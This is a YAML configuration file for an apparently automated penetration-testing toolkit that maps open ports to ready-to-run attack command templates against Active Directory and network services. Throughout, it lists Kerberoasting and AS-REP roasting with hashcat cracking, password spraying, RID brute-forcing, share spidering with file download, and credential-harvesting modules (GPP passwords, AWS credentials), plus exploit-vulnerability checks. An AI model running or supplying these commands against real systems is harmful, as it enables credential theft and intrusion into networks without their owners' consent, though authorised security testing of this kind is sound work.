# Declarative task definitions.
#
# This file holds the *data* side of task building: the command templates,
# their pane grouping, delays, and descriptions.  The *logic* side — runtime
# probes (enum_smb_shares, anonymous_bind), which variant to pick, and loops
# over enumerated shares — stays in Python (builders.py / tasks.py).
#
# Placeholders use {{name}} and are substituted by task_spec.render_panes().
# Available names depend on the handler; common ones: ip, domain, fqdn,
# dc_fqdn, user, password, share, ft (faketime prefix, trailing space).
#
# Pane keys:
#   description  human-readable label (shown in logs / tests)
#   delay        seconds to sleep before the pane runs (default 2)
#   run          command strings always included
#   run_if_cred  command strings appended only when a credential is present

# ===========================================================================
# Dispatch metadata (consumed by tasks.handle_task)
# ===========================================================================

# Credential-spraying targets: port -> protocol label.  Independent of the
# task handlers below (e.g. 22/3389/5900/5985 have no handler, and 135 sprays
# as "wmi" while its handler is rpc).
sprayable_ports:
  21: ftp
  22: ssh
  135: wmi
  389: ldap
  445: smb
  1433: mssql
  3389: rdp
  5900: vnc
  5985: winrm

# Port -> task handler.  "builder" uses the generic path: resolve each arg from
# the context (see _RESOLVERS in tasks.py), call the builder, run the commands.
# "custom" names a bespoke handler for protocols with probe/orchestration logic.
# Adding a simple protocol = add a builder + a tasks.yaml section + one row here.
handlers:
  21:   {builder: ftp,      args: [ip, cred]}
  53:   {builder: dns,      args: [ip, domain]}
  80:   {builder: http,     args: [ip, fqdn]}
  88:   {builder: kerberos, args: [ip, domain, cred]}
  135:  {builder: rpc,      args: [ip]}
  389:  {custom: ldap}
  443:  {builder: https,    args: [https_fqdn]}
  445:  {custom: smb}
  1433: {builder: mssql,    args: [ip, domain, cred], require_cred: true}
  2049: {builder: nfs,      args: [ip]}

# ===========================================================================
# Command definitions
# ===========================================================================

# ---------------------------------------------------------------------------
# FTP (port 21) — simple, fully declarative
# ---------------------------------------------------------------------------
ftp:
  panes:
    - description: "FTP enumeration"
      delay: 7
      run:
        - "nxc ftp {{ip}} -u '' -p '' --ls"
      run_if_cred:
        - "nxc ftp {{ip}} -u '{{user}}' -p '{{password}}' --ls"

# ---------------------------------------------------------------------------
# DNS (port 53) — simple, fully declarative
# ---------------------------------------------------------------------------
dns:
  panes:
    - description: "DNS enumeration"
      delay: 2
      run:
        - "dig @{{ip}} -x {{ip}} +short"
        - "dig axfr @{{ip}} {{domain}}"

# ---------------------------------------------------------------------------
# LDAP / Active Directory (port 389) — hybrid: Python picks the variant
# (cred > anon > none) and weaves the faketime prefix in via {{ft}}.
# ---------------------------------------------------------------------------
ldap:
  variants:
    auth:
      - description: "LDAP AD enumeration (auth)"
        delay: 7
        run:
          - "{{ft}}bloodyAD --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -p '{{password}}' -k get writable"
          - "echo"
          - "rm -f $(pwd)/hashes.kerberoast"
          - "{{ft}}nxc ldap {{ip}} -u '{{user}}' -p '{{password}}' -k --pass-pol --pso --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa"
          - "{{ft}}nxc ldap {{ip}} -u '{{user}}' -p '{{password}}' -k -M maq -M sccm -M laps -M adcs -M pre2k -M badsuccessor -M dns-nonsecure -M dump-computers -M get-network -M obsolete"
          - "echo"
          - "hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet"
          - "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
          - "hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
      - description: "Certificate enumeration (auth)"
        delay: 7
        run:
          - "rm -f $(pwd)/initial_enabled_Certipy.json"
          - "{{ft}}certipy find -u '{{user}}'@{{domain}} -p '{{password}}' -k -target {{dc_fqdn}} -dc-ip {{ip}} -stdout -json -output initial_enabled -timeout 2 -enabled"
          # Literal block scalar: keeps the backslash-n literal (double-quoted
          # YAML would turn \n into a real newline and break the command).
          - |-
            echo -e '\n<--- Find Vulnerable: --->\n'
          - "{{ft}}certipy find -u '{{user}}'@{{domain}} -p '{{password}}' -k -target {{dc_fqdn}} -dc-ip {{ip}} -stdout -timeout 2 -vulnerable"
          - "echo"
          - "parse_certipy.py initial_enabled_Certipy.json"
          - "echo"
          - "{{ft}}powerview {{domain}}/'{{user}}':'{{password}}'@{{dc_fqdn}} -k --web --no-cache"
      - description: "Start BloodHound"
        delay: 2
        run:
          - "bloodhound-cli up"
          - "sleep 1"
          - "echo"
          - "{{ft}}bloodhound-ce-python --zip -c All -d {{domain}} -dc {{dc_fqdn}} -ns {{ip}} -u '{{user}}' -p '{{password}}' -op ia && bloodhound-ce-ctl -u http://127.0.0.1:8081 -c -p -z $(ls -t ia_*_bloodhound.zip | head -n1)"
    anon:
      - description: "LDAP anonymous enumeration"
        delay: 7
        run:
          - "rm -f $(pwd)/hashes.kerberoast"
          - "nxc ldap {{dc_fqdn}} -u '' -p '' --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa"
          - "echo"
          - "hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet"
          - "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
          - "hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
      - description: "PowerView anonymous"
        delay: 2
        run:
          - "powerview {{dc_fqdn}} --no-cache"

# ---------------------------------------------------------------------------
# SMB (port 445) — hybrid: variant chosen in Python, per-share loop in Python,
# command text lives here.
# ---------------------------------------------------------------------------
smb:
  base:
    auth:
      - description: "aliasr SMB scan (auth)"
        delay: 2
        run:
          - "aliasr clear all"
          - "echo"
          - "aliasr scan {{ip}} -u '{{user}}' -p '{{password}}'"
      - description: "SMB module scan (auth)"
        delay: 7
        run:
          - "{{ft}}nxc smb {{ip}} -u '{{user}}' -p '{{password}}' -k --pass-pol --shares"
          - "{{ft}}nxc smb {{ip}} -u '{{user}}' -p '{{password}}' -k -M timeroast"
          - "{{ft}}nxc smb {{ip}} -u '{{user}}' -p '{{password}}' -k -M ntlm_reflection -M sccm-recon6 -M printnightmare -M webdav -M spooler -M ioxidresolver -M gpp_autologin -M gpp_password -M ms17-010 -M nopac -M remove-mic -M smbghost -M enum_ca -M aws-credentials"
      - description: "SMB RID brute (auth)"
        delay: 7
        run:
          - "rm -f $(pwd)/smb.out"
          - "{{ft}}nxc smb {{ip}} -u '{{user}}' -p '{{password}}' -k --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out"
          - "cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt"
          - "echo"
          - "cat users.txt"
    anon:
      - description: "aliasr SMB scan (anon)"
        delay: 2
        run:
          - "aliasr clear all"
          - "echo"
          - "aliasr scan {{ip}}"
      - description: "SMB RID brute (anon)"
        delay: 7
        run:
          - "rm -f $(pwd)/smb.out"
          - "nxc smb {{ip}} -u '' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out"
          - "nxc smb {{ip}} -u 'a' -p '' --rid-brute 10000 --log $(pwd)/smb.out"
          - "cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt"
          - "echo"
          - "cat users.txt"
          - "echo"
          - "{{ft}}nxc smb {{ip}} -u users.txt -p users.txt -k --no-bruteforce --continue-on-success"
          - "nxc smb {{ip}} -u users.txt -p '' --continue-on-success"

  # Per-share spider.  Keyed by share_method; the Python builder loops over the
  # enumerated non-default shares and renders this template once per share.
  spider:
    "user/pass":
      description: "SMB spider: {{share}} (auth)"
      delay: 7
      run:
        - "{{ft}}nxc smb {{ip}} -u '{{user}}' -p '{{password}}' -k --spider '{{share}}' --regex . --depth 2"
    "null":
      description: "SMB spider: {{share}} (null)"
      delay: 7
      run:
        - "nxc smb {{ip}} -u '' -p '' --spider '{{share}}' --regex . --depth 2"
    "guest":
      description: "SMB spider: {{share}} (guest)"
      delay: 7
      run:
        - "nxc smb {{ip}} -u 'a' -p '' --spider '{{share}}' --regex . --depth 2"

  # One-shot spider_plus download + smbclientng, keyed by share_method.
  spider_plus:
    "user/pass":
      description: "SMB spider_plus (auth)"
      delay: 7
      run:
        - "{{ft}}nxc smb {{ip}} -u '{{user}}' -p '{{password}}' -k -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=."
        - "cat {{ip}}.json | jq '. | map_values(keys)'"
        - "echo"
        - "{{ft}}smbclientng --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -p '{{password}}' -k -S <(echo 'shares')"
    "null":
      description: "SMB spider_plus (null)"
      delay: 7
      run:
        - "nxc smb {{ip}} -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=."
        - "cat {{ip}}.json | jq '. | map_values(keys)'"
        - "echo"
        - "smbclientng --host {{ip}} -d {{domain}} -u '' -p '' -S <(echo 'shares')"
    "guest":
      description: "SMB spider_plus (guest)"
      delay: 7
      run:
        - "nxc smb {{ip}} -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=."
        - "cat {{ip}}.json | jq '. | map_values(keys)'"
        - "echo"
        - "smbclientng --host {{ip}} -d {{domain}} -u a -p '' -S <(echo 'shares')"

# ---------------------------------------------------------------------------
# HTTP (port 80)
# ---------------------------------------------------------------------------
http:
  panes:
    - description: "HTTP enumeration"
      delay: 2
      run:
        # Block scalar: keeps the literal { } and " in the burpsuite guard
        # with no escaping. {{ }} placeholders still work inside it.
        - |-
          pgrep -fi "burpsuite" > /dev/null 2>&1 || { BurpSuitePro &>/dev/null & } 2>/dev/null || { BurpSuiteCommunity &>/dev/null & } 2>/dev/null || { burpsuite &>/dev/null & } 2>/dev/null
        - "firefox 'http://{{fqdn}}' &> /dev/null & disown"
        - "ffuf -w /usr/share/seclists/Discovery/DNS/services-names.txt -u http://{{fqdn}} -H 'Host: FUZZ.{{fqdn}}' -ac -c"
        - "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{{fqdn}} -H 'Host: FUZZ.{{fqdn}}' -ac -c"
        - "ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://{{fqdn}}/FUZZ -ac -c"
        - "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{{fqdn}}/FUZZ -ac -c"
        - "feroxbuster -u http://{{fqdn}}"
    - description: "WordPress scan"
      delay: 2
      run:
        - "wpscan --no-update --url http://{{fqdn}} --detection-mode aggressive -e ap,u"
        - "wpscan --no-update --url http://{{fqdn}} --detection-mode aggressive -e ap,u --plugins-detection aggressive -o wpscan_long.out"
    - description: "Nuclei scan"
      delay: 2
      run:
        - "sleep 30"
        - "nuclei -u {{ip}} -severity critical,high,medium -c 10"

# ---------------------------------------------------------------------------
# HTTPS (port 443)
# ---------------------------------------------------------------------------
https:
  panes:
    - description: "HTTPS inspection"
      delay: 2
      run:
        - |-
          pgrep -fi "burpsuite" > /dev/null 2>&1 || { BurpSuitePro &>/dev/null & } 2>/dev/null || { BurpSuiteCommunity &>/dev/null & } 2>/dev/null || { burpsuite &>/dev/null & } 2>/dev/null
        - "firefox 'https://{{fqdn}}' &> /dev/null & disown"
        - "curl -Ik https://{{fqdn}}"

# ---------------------------------------------------------------------------
# Kerberos (port 88) — {{ft}} faketime prefix supplied by the builder
# ---------------------------------------------------------------------------
kerberos:
  tgt:
    description: "Get TGT"
    delay: 2
    run:
      - "{{ft}}getTGT.py {{domain}}/'{{user}}':'{{password}}'"
  userenum:
    description: "Kerbrute user enumeration"
    delay: 20
    run:
      - "kerbrute userenum -d {{domain}} --dc {{ip}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"

# ---------------------------------------------------------------------------
# RPC (port 135)
# ---------------------------------------------------------------------------
rpc:
  panes:
    - description: "RPC query"
      delay: 2
      run:
        - "echo querydominfo | rpcclient {{ip}}"
        - "echo querydominfo | rpcclient -U '' -N {{ip}}"

# ---------------------------------------------------------------------------
# MSSQL (port 1433) — requires credentials
# ---------------------------------------------------------------------------
mssql:
  panes:
    - description: "MSSQL enumeration"
      delay: 7
      run:
        - "{{ft}}nxc mssql {{ip}} -u '{{user}}' -p '{{password}}' -k -M enum_impersonate -M enum_links -M enum_logins"
        - "nxc mssql {{ip}} -u '{{user}}' -p '{{password}}' --local-auth -M enum_impersonate -M enum_links -M enum_logins"
        - "nxc mssql {{ip}} -u '{{user}}' -p '{{password}}' -d . -M enum_impersonate -M enum_links -M enum_logins"
    - description: "mssqlclient"
      delay: 2
      run:
        - "mssqlclient.py {{domain}}/'{{user}}':'{{password}}'@{{ip}}"
    - description: "mssqlclient (Windows auth)"
      delay: 2
      run:
        - "mssqlclient.py {{domain}}/'{{user}}':'{{password}}'@{{ip}} -windows-auth"

# ---------------------------------------------------------------------------
# NFS (port 2049)
# ---------------------------------------------------------------------------
nfs:
  panes:
    - description: "NFS enumeration"
      delay: 2
      run:
        - "showmount -e {{ip}}"
        - "nxc nfs {{ip}} --enum-shares"
